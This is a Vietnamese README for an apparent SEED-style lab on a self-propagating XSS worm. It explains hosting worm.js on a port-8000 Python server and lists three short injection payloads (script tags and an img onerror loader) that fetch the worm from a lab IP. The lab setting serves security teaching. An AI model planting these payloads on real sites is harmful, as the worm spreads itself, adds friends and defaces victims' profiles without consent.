# Hướng dẫn Dựng Web Server Host File `worm.js` (Cổng 8000)

Thư mục này chứa Web Server cá nhân và mã nguồn `worm.js` phục vụ bài tập **Self-Propagation XSS Worm trên trường Brief Description (giới hạn 250 ký tự)**.

---

## 1. Cấu trúc thư mục
- `worm.js`: File JavaScript thực thi hành động tấn công XSS Worm (tự động kết bạn, tự sao chép payload sang `Brief Description` của nạn nhân, và đổi `About me` thành `"Tài khoản này đã bị Hack bởi <MSV>"`).
- `server.py`: Script khởi chạy Python HTTP Server ở cổng `8000` (tương đương `python3 -m http.server 8000`, có bổ sung chống cache trình duyệt và in sẵn đường dẫn URL + payload).

---

## 2. Hai cách khởi chạy Web Server cổng 8000

### Cách 1: Dùng lệnh chuẩn như gợi ý trong đề bài
Mở Terminal / PowerShell tại thư mục `worm_server`:

- **Trên Windows (PowerShell / CMD)**:
  ```powershell
  cd worm_server
  python -m http.server 8000
  ```
- **Trên Linux / Máy ảo Ubuntu (SEED Labs)**:
  ```bash
  cd worm_server
  python3 -m http.server 8000
  ```

### Cách 2: Dùng script `server.py` (Khuyên dùng khi quay video demo)
```powershell
python worm_server/server.py
```
*(Script này tự động phục vụ đúng thư mục `worm_server` ở cổng `8000`, tắt cache để mỗi lần sửa `worm.js` trình duyệt cập nhật ngay, và hiển thị sẵn danh sách IP + độ dài payload).*

---

## 3. Các Payload rút gọn chèn vào trường `Brief Description` (Tối đa 250 ký tự)

Giả sử địa chỉ IP máy chạy Web Server là `192.168.231.1` (hoặc `10.9.0.1` / `localhost` tùy môi trường lab):

1. **Cách 1 — Dùng thẻ `<script>` chuẩn (68 ký tự << 250 ký tự)**:
   ```html
   <script type="text/javascript" src="http://192.168.231.1:8000/worm.js"></script>
   ```
2. **Cách 2 — Dùng thẻ `<script>` rút gọn (52 ký tự << 250 ký tự)**:
   ```html
   <script src="http://192.168.231.1:8000/worm.js"></script>
   ```
3. **Cách 3 — Dùng thẻ `<img onerror=...>` (94 ký tự << 250 ký tự)**:
   ```html
   <img src=x onerror="var s=document.createElement('script');s.src='http://192.168.231.1:8000/worm.js';document.body.appendChild(s);">
   ```

---

## 4. Kiểm tra Web Server đã hoạt động
Sau khi bật server, mở trình duyệt hoặc chạy `curl` tới:
- `http://127.0.0.1:8000/worm.js`
- Hoặc từ máy ảo VMware: `http://192.168.231.1:8000/worm.js` (VMnet8) / `http://192.168.127.1:8000/worm.js` (VMnet1)

Nếu trình duyệt hiển thị nội dung code JavaScript của `worm.js` và cửa sổ Terminal hiện dòng log:
```text
"GET /worm.js HTTP/1.1" 200 -
```
thì Web Server đã sẵn sàng!
